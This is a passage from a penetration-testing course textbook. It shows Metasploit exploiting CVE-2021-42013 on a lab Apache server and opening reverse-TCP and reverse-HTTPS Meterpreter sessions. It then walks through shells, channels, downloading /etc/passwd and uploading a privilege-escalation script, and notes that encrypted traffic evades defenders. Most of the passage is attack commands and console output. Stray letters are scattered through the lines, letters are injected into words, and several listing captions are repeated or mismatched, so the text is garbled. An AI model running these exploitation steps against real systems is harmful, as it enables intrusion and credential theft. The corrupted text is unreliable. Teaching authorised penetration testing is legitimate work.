Payload options (linux/x64/meterpreter_reverse_tcp):
i
Name Current Setting Reqzuired Description
---- --------------- -------- -----------
LHOST 192.168.119.2 yes The listen address (an interface may be
D
specified)
LPORT 4444 yes The listen port
...
Listing 650 - Review compatible Meterpreter payloads of the exploit module and use 64bit meterpreter_reverse_tcp
Listing 650 shows that there are various Meterpreter payloads compatible for the currently
activated exploit module.
At this point, we should note that all Meterpreter payloads are staged. However, the output of
show payloads contains staged and non-staged payloads. The difference between those two
types is how the Meterpreter payload is transferred to the target machine. The non-staged
version includes all components required to launch a Meterpreter session while the staged
version uses a separate first stage to load these components.984 Loading these components over
the network creates quite some traffic and may alert defensive mechanisms. In situations where
our bandwidth is limited or we want to use the same payload to compromise multiple systems in
an assessment, a non-staged Meterpreter payload comes in quite handy.985 For the rest of the
Module, we’ll use the non-staged version whenever we use a Meterpreter payload.
984 (Buffered, 2016), https://buffered.io/posts/staged-vs-stageless-handlers/
985 (Rapid7, 2015), https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 656
Made in Morocco
Penetration Testing with Kali Linux
After selecting the 64-bit non-staged version of meterpreter_reverse_tcp as payload, we can
review its options. For this particular payload, the same options apply as for the previous
payloads we used.
Now, let’s run the exploit module with our Meterpreter payload and once we obtain a Meterpreter
command prompt, we’ll display its available commands by entering help.
msf6 exploit(multi/http/apache_normalize_path_rce) > run
[*] Started reverse TCP handler on 192.168.119.4:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is
enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.50.16:80 - Sending linux/x64/meterpreter_ryeverse_tcp command
payload
[*] Meterpreter session 4 opened (192.168.119.4:4444 -> 192.168.50.16:35538) at 2022-
k
08-08 05:20:20 -0400
[!] This exploit may require manual cleanup of '/tmp/GfRglhc' on the target
s
meterpreter > help
o
Core Commands
=============
n
Command Description
------- -----------
i
? Help menu
z
background Backgrounds the current session
...
channel D Displays information or control active channels
close Closes a channel
...
info Displays information about a Post module
...
load Load one or more meterpreter extensions
...
run Executes a meterpreter script or Post module
secure (Re)Negotiate TLV packet encryption on the session
sessions Quickly switch to another session
...
...
Stdapi: System Commands
=======================
Command Description
------- -----------
execute Execute a command
getenv Get one or more environment variable values
getpid Get the current process identifier
getuid Get the user that the server is running as
kill Terminate a process
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 657
Made in Morocco
Penetration Testing with Kali Linux
localtime Displays the target system local date and time
pgrep Filter processes by name
pkill Terminate processes by name
ps List running processes
shell Drop into a system command shell
suspend Suspends or resumes a list of processes
sysinfo Gets information about the remote system, such as OS
Listing 651 - Display compatible payloads of the exploit module
A few moments after the exploit module is launched, we’ll get a Meterpreter command prompt as
shown in Listing 651. The commands of Meterpreter are divided into categories such as System
Commands, Networking Commands, and File system Commands.
Let’s get familiar with some of the Meterpreter commands. We’ll start gathering information by
entering sysinfo and getuid.
y
meterpreter > sysinfo
Computer : 172.29.0.2
k
OS : Ubuntu 20.04 (Linux 5.4.0-122-generic)
Architecture : x64
BuildTuple : x86_64-linux-musl s
Meterpreter : x64/linux
meterpreter > getuid o
Server username: daemon
Listing 652 - Display compatible payloads of the exploit module
n
The commands provide us with information about the target computer, operating system, and the
current user.
i
As we’ve already learned, Metaszploit uses sessions to manage access to different machines.
When Metasploit interacts with a system within a session, it uses a concept named channels.
C z
Let’s start an interactive shDell by entering shell, execute a command in the context of a channel,
and background the channel the shell runs in. To background a channel, we can use + .
meterpreter > shell
Process 194 created.
Channel 1 created.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
^Z
Background channel 1? [y/N] y
meterpreter >
Listing 653 - Start a channel and background it
Next, we’ll start a second interactive shell, execute a command, and also, background the
channel.
meterpreter > shell
Process 196 created.
Channel 2 created.
whoami
daemon
^Z
Background channel 2? [y/N] y
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 658
Made in Morocco
Penetration Testing with Kali Linux
Listing 654 - Start a second channel and background it
Now, let’s list all active channels and interact with channel 1 again. To list all active channels, we
can enter channel -l and to interact with one, we can use channel -i and the channel ID as
argument.
meterpreter > channel -l
Id Class Type
-- ----- ----
1 3 stdapi_process
2 3 stdapi_process
meterpreter > channel -i 1
Interacting with channel 1...
y
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
k
Listing 655 - List all active channels and interact with channel 1
Listing 655 shows we can execute commands in the context of channel 1 again. Using channels
s
will help us tremendously to manage system access and perform post-exploitation operations.
Next, let’s use the download and upload commandos from the category File system Commands to
transfer files to and from the system. For this, let’s review the commands of this category first.
meterpreter > help n
...
Stdapi: File system Commands
i
============================
z
Command Description
------- -----------
D
cat Read the contents of a file to the screen
cd Change directory
checksum Retrieve the checksum of a file
chmod Change the permissions of a file
cp Copy source to destination
del Delete the specified file
dir List files (alias for ls)
download Download a file or directory
edit Edit a file
getlwd Print local working directory
getwd Print working directory
lcat Read the contents of a local file to the screen
lcd Change local working directory
lls List local files
lpwd Print local working directory
ls List files
mkdir Make directory
mv Move source to destination
pwd Print working directory
rm Delete the specified file
rmdir Remove directory
search Search for files
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 659
Made in Morocco
Penetration Testing with Kali Linux
upload Upload a file or directory
...
Listing 656 - List all File system Commands of Meterpreter
Listing 656 shows us various commands that we can use to upload, download, or manage files
on the local and target system. Commands with “l” as prefix operate on the local system; in our
case our Kali VM. For example, we can use these commands to change the directory to where we
want to download or upload files.
Let’s download /etc/passwd from the target machine to our Kali system. For this, we’ll change
the local directory on our Kali machine to /home/kali/Downloads first. Then, we’ll enter the
download command and /etc/passwd as argument.
meterpreter > lpwd
/home/kali
y
meterpreter > lcd /home/kali/Downloads
k
meterpreter > lpwd
/home/kali/Downloads
s
meterpreter > download /etc/passwd
[*] Downloading: /etc/passwd -> /home/kali/Downloads/passwd
o
[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd ->
/home/kali/Downloads/passwd
[*] download : /etc/passwd -> /home/kali/Downloads/passwd
n
meterpreter > lcat /home/kali/Downloads/passwd
root:x:0:0:root:/root:/bin/bash
i
...
z
Listing 657 - Change local directory and download /etc/passwd from the target machine
Listing 657 shows that we cDould successfully download /etc/passwd to our local machine.
Next, let’s assume we want to run unix-privesc-check986 like in a previous Module to find potential
privilege escalation vectors. Let’s upload the file to /tmp on the target system.
meterpreter > upload /usr/bin/unix-privesc-check /tmp/
[*] uploading : /usr/bin/unix-privesc-check -> /tmp/
[*] uploaded : /usr/bin/unix-privesc-check -> /tmp//unix-privesc-check
meterpreter > ls /tmp
Listing: /tmp
=============
Mode Size Type Last modified Name
---- ---- ---- ------------- ----
...
100644/rw-r--r-- 36801 fil 2022-08-08 05:26:15 -0400 unix-privesc-check
Listing 658 - Change local directory and download /etc/passwd from the target machine
986 (Github, 2021), https://github.com/pentestmonkey/unix-privesc-check
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 660
Made in Morocco
Penetration Testing with Kali Linux
Listing 658 shows that we successfully uploaded unix-privesc-check to the target machine. If our
target runs the Windows operating system, we need to escape the backslashes in the destination
path with backslashes like “\\”.
So far, we’ve used the linux/x64/meterpreter_reverse_tcp payload in this section to explore various
features of Meterpreter. Before we head into the next section, let’s use another 64-bit Linux
Meterpreter payload. Therefore, we exit the current session and use show payloads in the context
of the exploit module again.
meterpreter > exit
[*] Shutting down Meterpreter...
[*] 192.168.50.16 - Meterpreter session 4 closed. Reason: User exit
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
y
Compatible Payloads
=================== k
# Name Disclosure Date Rank
Check Description s
- ---- --------------- ---- ----
- -----------
o
...
10 payload/linux/x64/meterpreter_reverse_https normal No
Linux Meterpreter, Reverse HTTPS Inline
n
...
Listing 659 - Display Meterpreter HTTPS non-staged payload
i
Listing 659 shows that index 10 is payload/linux/x64/meterpreter_reverse_https. Instead of a raw
z
TCP connection, this payload uses HTTPS to establish the connection and communication
between the infected target and our Kali machine. As the traffic itself is encrypted with SSL/TLS,
D
defenders will only obtain information about HTTPS requests. Without further defensive
techniques and technologies, they will be unlikely to decipher the Meterpreter communication.
Let’s select this payload and display its options.
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 10
payload => linux/x64/meterpreter_reverse_https
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
...
Payload options (linux/x64/meterpreter_reverse_https):
Name Current Setting Required Description
---- --------------- -------- -----------
LHOST 192.168.119.2 yes The local listener hostname
LPORT 4444 yes The local listener port
LURI no The HTTP Path
...
Listing 660 - Display Meterpreter HTTPS non-staged payload
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 661
Made in Morocco
Penetration Testing with Kali Linux
Listing 660 shows there is an additional option for this payload named LURI. This option can be
used to leverage a single listener on one port capable of handling different requests based on the
path in this option and provide a logical separation. If we leave this option blank, Metasploit just
uses / as path.
Now, let’s launch the exploit module by entering run without setting a value to the LURI option.
msf6 exploit(multi/http/apache_normalize_path_rce) > run
[*] Started HTTPS reverse handler on https://192.168.119.4:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is
enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013